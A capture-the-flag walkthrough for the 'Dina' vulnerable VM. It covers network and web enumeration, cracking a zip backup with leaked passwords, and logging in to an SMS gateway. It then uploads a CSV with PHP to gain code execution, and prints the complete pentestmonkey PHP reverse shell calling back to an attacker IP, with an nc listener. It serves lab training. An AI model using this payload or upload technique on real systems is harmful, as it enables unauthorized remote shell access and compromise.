# Dina Walkthrough

Use netdiscover to find the ip of the vm

Command:

      $netdiscover
      
Output:

    Currently scanning: 192.168.52.0/16   |   Screen View: Unique Hosts                                              

     2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 84                                                   
     _____________________________________________________________________________
       IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
     -----------------------------------------------------------------------------
     192.168.42.54   08:00:27:84:8e:f5      1      42  PCS Systemtechnik GmbH                                         
     192.168.42.129  06:23:0e:e5:82:1a      1      42  Unknown vendor
     
We got the ip.addr==192.168.42.54

nmap results:

            $ sudo nmap -A -p- -sS -sV 192.168.42.54 
            Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 20:33 IST
            Nmap scan report for 192.168.42.54
            Host is up (0.00054s latency).
            Not shown: 65534 closed tcp ports (reset)
            PORT   STATE SERVICE VERSION
            80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
            | http-robots.txt: 5 disallowed entries 
            |_/ange1 /angel1 /nothing /tmp /uploads
            |_http-title: Dina
            |_http-server-header: Apache/2.2.22 (Ubuntu)
            MAC Address: 08:00:27:84:8E:F5 (Oracle VirtualBox virtual NIC)
            Device type: general purpose
            Running: Linux 2.6.X|3.X
            OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
            OS details: Linux 2.6.32 - 3.5
            Network Distance: 1 hop

            TRACEROUTE
            HOP RTT     ADDRESS
            1   0.54 ms 192.168.42.54

            OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
            Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
            
Using the port 80 open the ip in browser,

Open the dir robots.txt

Result:

            User-agent: *
            Disallow: /ange1
            Disallow: /angel1
            Disallow: /nothing
            Disallow: /tmp
            Disallow: /uploads
            
            
We will get some password from the inspection on the link:

            http://192.168.42.54/nothing/
commented pass:
            
            #my secret pass
            freedom
            password
            helloworld!
            diana
            iloveroot
We can use this as a password wordlist in the next following steps.

Busting the directories of the ip:

command:
        
            $dirb http://192.168.42.54 /usr/share/dirb/wordlists/big.txt

Result:

            -----------------
            DIRB v2.22    
            By The Dark Raver
            -----------------

            START_TIME: Sun May 28 20:45:04 2023
            URL_BASE: http://192.168.42.54/
            WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt

            -----------------

            GENERATED WORDS: 20458                                                         

            ---- Scanning URL: http://192.168.42.54/ ----
            + http://192.168.42.54/cgi-bin/ (CODE:403|SIZE:289)                                                                
            + http://192.168.42.54/index (CODE:200|SIZE:3618)                                                                  
            ==> DIRECTORY: http://192.168.42.54/nothing/                                                                       
            + http://192.168.42.54/robots (CODE:200|SIZE:102)                                                                  
            + http://192.168.42.54/robots.txt (CODE:200|SIZE:102)                                                              
            ==> DIRECTORY: http://192.168.42.54/secure/                                                                        
            + http://192.168.42.54/server-status (CODE:403|SIZE:294)                                                           
            ==> DIRECTORY: http://192.168.42.54/tmp/                                                                           
            ==> DIRECTORY: http://192.168.42.54/uploads/                                                                       

            ---- Entering directory: http://192.168.42.54/nothing/ ----
            + http://192.168.42.54/nothing/index (CODE:200|SIZE:180)                                                           
            + http://192.168.42.54/nothing/pass (CODE:200|SIZE:57)                                                             

            ---- Entering directory: http://192.168.42.54/secure/ ----
            (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
                (Use mode '-w' if you want to scan it anyway)

            ---- Entering directory: http://192.168.42.54/tmp/ ----
            (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
                (Use mode '-w' if you want to scan it anyway)

            ---- Entering directory: http://192.168.42.54/uploads/ ----
            (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
                (Use mode '-w' if you want to scan it anyway)

            -----------------
            END_TIME: Sun May 28 20:45:09 2023
            DOWNLOADED: 40916 - FOUND: 7
We got a backup.zip inside the dir:

            http://192.168.42.54/secure/          
The file inside the zip is password encrypted and we have some wordlist from the nothing dir. We can try it with john or else manually typing it one by one.

The pass is:
freedom

That is a ASCII file with mp3 extension(You can verify it with $file command)

The file has the text:

            I am not toooo smart in computer .......dat the resoan i always choose easy password...with creds backup file....

            uname: touhid
            password: ******


            url : /SecreTSMSgatwayLogin

We got a url and a username from here.

We will get a login page when you run the url:

            http://192.168.42.54/SecreTSMSgatwayLogin
            
We have a username and a password wordlist that we can try on it,

We will be signed in with the creds:

            uname: touhid
            pass: diana

After logging in, we could see some options were we could upload things.

In the 'sent from file' option we can send the message to the destination phone. As it can't excecute anything with db in the backend, look for any other way to shell upload.

Phonebook import is another option in the site where we could upload things to the backend database:

It specifies a format for the csv as:

            CSV file format : Name, Mobile, Email, Group code, Tags
Make a CSV file using libre office cal having the columns (Name, Mobile, Email, Group code, Tags)
		
![image](https://github.com/keerthiprabup/VM/assets/116485904/aed0000e-7ed8-4215-b9c1-48fece13fa1f)


Enter a php cli excecutable in any column of the csv file and upload it.
Boom!! we were getting responses from the backend. Now we can upload the reverse shell script in the csv file.

Reverse shell script from pentest monkey;

            <?php
            // php-reverse-shell - A Reverse Shell implementation in PHP
            // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
            //
            // This tool may be used for legal purposes only.  Users take full responsibility
            // for any actions performed using this tool.  The author accepts no liability
            // for damage caused by this tool.  If these terms are not acceptable to you, then
            // do not use this tool.
            //
            // In all other respects the GPL version 2 applies:
            //
            // This program is free software; you can redistribute it and/or modify
            // it under the terms of the GNU General Public License version 2 as
            // published by the Free Software Foundation.
            //
            // This program is distributed in the hope that it will be useful,
            // but WITHOUT ANY WARRANTY; without even the implied warranty of
            // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
            // GNU General Public License for more details.
            //
            // You should have received a copy of the GNU General Public License along
            // with this program; if not, write to the Free Software Foundation, Inc.,
            // 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
            //
            // This tool may be used for legal purposes only.  Users take full responsibility
            // for any actions performed using this tool.  If these terms are not acceptable to
            // you, then do not use this tool.
            //
            // You are encouraged to send comments, improvements or suggestions to
            // me at pentestmonkey@pentestmonkey.net
            //
            // Description
            // -----------
            // This script will make an outbound TCP connection to a hardcoded IP and port.
            // The recipient will be given a shell running as the current user (apache normally).
            //
            // Limitations
            // -----------
            // proc_open and stream_set_blocking require PHP version 4.3+, or 5+
            // Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
            // Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
            //
            // Usage
            // -----
            // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

            set_time_limit (0);
            $VERSION = "1.0";
            $ip = '192.168.42.104';  // CHANGE THIS
            $port = 1234;       // CHANGE THIS
            $chunk_size = 1400;
            $write_a = null;
            $error_a = null;
            $shell = 'uname -a; w; id; /bin/sh -i';
            $daemon = 0;
            $debug = 0;

            //
            // Daemonise ourself if possible to avoid zombies later
            //

            // pcntl_fork is hardly ever available, but will allow us to daemonise
            // our php process and avoid zombies.  Worth a try...
            if (function_exists('pcntl_fork')) {
                  // Fork and have the parent process exit
                  $pid = pcntl_fork();

                  if ($pid == -1) {
                        printit("ERROR: Can't fork");
                        exit(1);
                  }

                  if ($pid) {
                        exit(0);  // Parent exits
                  }

                  // Make the current process a session leader
                  // Will only succeed if we forked
                  if (posix_setsid() == -1) {
                        printit("Error: Can't setsid()");
                        exit(1);
                  }

                  $daemon = 1;
            } else {
                  printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
            }

            // Change to a safe directory
            chdir("/");

            // Remove any umask we inherited
            umask(0);

            //
            // Do the reverse shell...
            //

            // Open reverse connection
            $sock = fsockopen($ip, $port, $errno, $errstr, 30);
            if (!$sock) {
                  printit("$errstr ($errno)");
                  exit(1);
            }

            // Spawn shell process
            $descriptorspec = array(
               0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
               1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
               2 => array("pipe", "w")   // stderr is a pipe that the child will write to
            );

            $process = proc_open($shell, $descriptorspec, $pipes);

            if (!is_resource($process)) {
                  printit("ERROR: Can't spawn shell");
                  exit(1);
            }

            // Set everything to non-blocking
            // Reason: Occsionally reads will block, even though stream_select tells us they won't
            stream_set_blocking($pipes[0], 0);
            stream_set_blocking($pipes[1], 0);
            stream_set_blocking($pipes[2], 0);
            stream_set_blocking($sock, 0);

            printit("Successfully opened reverse shell to $ip:$port");

            while (1) {
                  // Check for end of TCP connection
                  if (feof($sock)) {
                        printit("ERROR: Shell connection terminated");
                        break;
                  }

                  // Check for end of STDOUT
                  if (feof($pipes[1])) {
                        printit("ERROR: Shell process terminated");
                        break;
                  }

                  // Wait until a command is end down $sock, or some
                  // command output is available on STDOUT or STDERR
                  $read_a = array($sock, $pipes[1], $pipes[2]);
                  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

                  // If we can read from the TCP socket, send
                  // data to process's STDIN
                  if (in_array($sock, $read_a)) {
                        if ($debug) printit("SOCK READ");
                        $input = fread($sock, $chunk_size);
                        if ($debug) printit("SOCK: $input");
                        fwrite($pipes[0], $input);
                  }

                  // If we can read from the process's STDOUT
                  // send data down tcp connection
                  if (in_array($pipes[1], $read_a)) {
                        if ($debug) printit("STDOUT READ");
                        $input = fread($pipes[1], $chunk_size);
                        if ($debug) printit("STDOUT: $input");
                        fwrite($sock, $input);
                  }

                  // If we can read from the process's STDERR
                  // send data down tcp connection
                  if (in_array($pipes[2], $read_a)) {
                        if ($debug) printit("STDERR READ");
                        $input = fread($pipes[2], $chunk_size);
                        if ($debug) printit("STDERR: $input");
                        fwrite($sock, $input);
                  }
            }

            fclose($sock);
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);

            // Like print, but does nothing if we've daemonised ourself
            // (I can't figure out how to redirect STDOUT like a proper daemon)
            function printit ($string) {
                  if (!$daemon) {
                        print "$string\n";
                  }
            }

            ?> 
You can set your system ip and port to connect in the script.
Open nc in listening mode on your terminal:

            $nc -lp <port>
Upload the csv script in the browser. 

At this moment we will have a reverse shell on our terminal







